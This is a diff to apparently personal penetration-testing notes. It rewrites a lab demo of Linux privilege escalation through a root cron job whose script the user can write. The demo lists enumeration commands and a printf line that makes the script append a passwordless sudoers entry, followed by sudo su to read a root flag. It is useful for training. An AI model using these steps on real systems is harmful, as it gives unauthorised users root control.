@@ -45,58 +45,79 @@ meterpeter: `./les.sh`
 
 Gives us Exploits and OS information. We download the exploit from the website. Navigate to the Exploit download.
 
-# Explooiting Misconfigured Cron Jobs 
-- Linux implements task schedzuling through a utility called Cron.
-- Cron is a time-based service that runs applications, scripts and other commands repeatedly on a specified schedule.
-- An application, or script that has been configured to be run repeatedly with Cron is known as a Cron job. Cron can be used to automate or repeat a wide variety of functions on a system, from daily backups to system upgrades and patches
-- The crontab file is a config file that is used by the Cron utility to store and track Cron jobs that have been created.
+# Exploiting misconfigured Cron Jobs
 
-- Cron jobs can also be run as any user on the system, this is a very important factor to keep an eye on as we will be targeting Cron jobs that have been configured to be run as the "root" user.
-- This is primarily because, any script or command that is run by a Cron job will run as the root user and will consequently provide us with root access.
-- In order to elevate our privileges, we will need to find and identify cron jobs scheduled by the root user or the files being processed by the cron job.
+## Understanding Cron Jobs
 
-## Demo: Exploiting Misconfigured Cron Jobs 
+    Cron: A time-based service in Linux used to schedule and automate tasks.
+    Cron Job: A task scheduled to run via Cron, such as backups or system upgrades.
+    Crontab File: The configuration file where Cron jobs are stored.
 
-`whoami`
+## Privilege Escalation Using Cron Jobs
 
-`groups student`
+    Cron Jobs as Root: If misconfigured, Cron jobs running as "root" can be exploited for root access.
 
-`cat /etc/passwd`
+## Demo: Using Cronjob
 
-`crontab -l`
+  `whoami`
+  Displays the current user’s username.
 
-`ls al`
+  `groups student`
+  Shows the groups that the "student" user belongs to.
 
-`cat message`
+  `cat /etc/passwd`
+  Displays the content of the /etc/passwd file, revealing user account information.
 
-`pwd`
+  `crontab -l`
+  Lists the Cron jobs scheduled for the current user.
 
-`cd /`
+  `ls -al`
+  Lists all files and directories in the current directory with detailed information.
 
-`grep -rnw /usr -e "/home/student/message"`
+  `cat message`
+  Displays the content of the "message" file.
 
-`ls -al /tmp`
+  `pwd`
+  Prints the current working directory.
 
-`cat /tmp/message`
+  `cd /`
+  Changes the directory to the root (/) of the filesystem.
 
-`ls -al /usr/local/share/copy.sh`
+  `grep -rnw /usr -e "/home/student/message"`
+  Recursively searches for the string "/home/student/message" in files under /usr.
 
-`cat /usr/local/share/copy.sh`
+  `ls -al /tmp`
+  Lists all files in the /tmp directory with detailed information.
 
-new tab
+  `cat /tmp/message`
+  Displays the content of the "message" file in the /tmp directory.
 
-`printf '#!/bin/bash\necho "student ALL=NOPASSWD:ALL" >> /etc/sudoers' > /usr/local/share/copy.sh` 
+  `ls -al /usr/local/share/copy.sh`
+  Lists detailed information about the copy.sh script.
 
-`sudo -l`
+  `cat /usr/local/share/copy.sh`
+  Displays the content of the copy.sh script.
 
-`sudo su`
+  `printf '#!/bin/bash\necho "student ALL=NOPASSWD:ALL" >> /etc/sudoers' > /usr/local/share/copy.sh`
+  Creates or modifies the copy.sh script to add a command that gives the "student" user root privileges.
 
-`whoami`
+  `sudo -l`
+  Lists the commands that the current user can run with sudo.
 
-`cd /root`
+  `sudo su`
+  Switches to the root user if allowed by sudo.
 
-`ls`
+  `whoami`
+  Confirms the current user, which should now be root.
 
-`cat flag`
+  `cd /root`
+  Changes the directory to the root user's home directory.
 
-`crontab -l`
+  `ls`
+  Lists files in the current directory.
+
+  `cat flag`
+  Displays the content of the "flag" file.
+
+  `crontab -l`
+  Re-checks the scheduled Cron jobs to verify any changes.
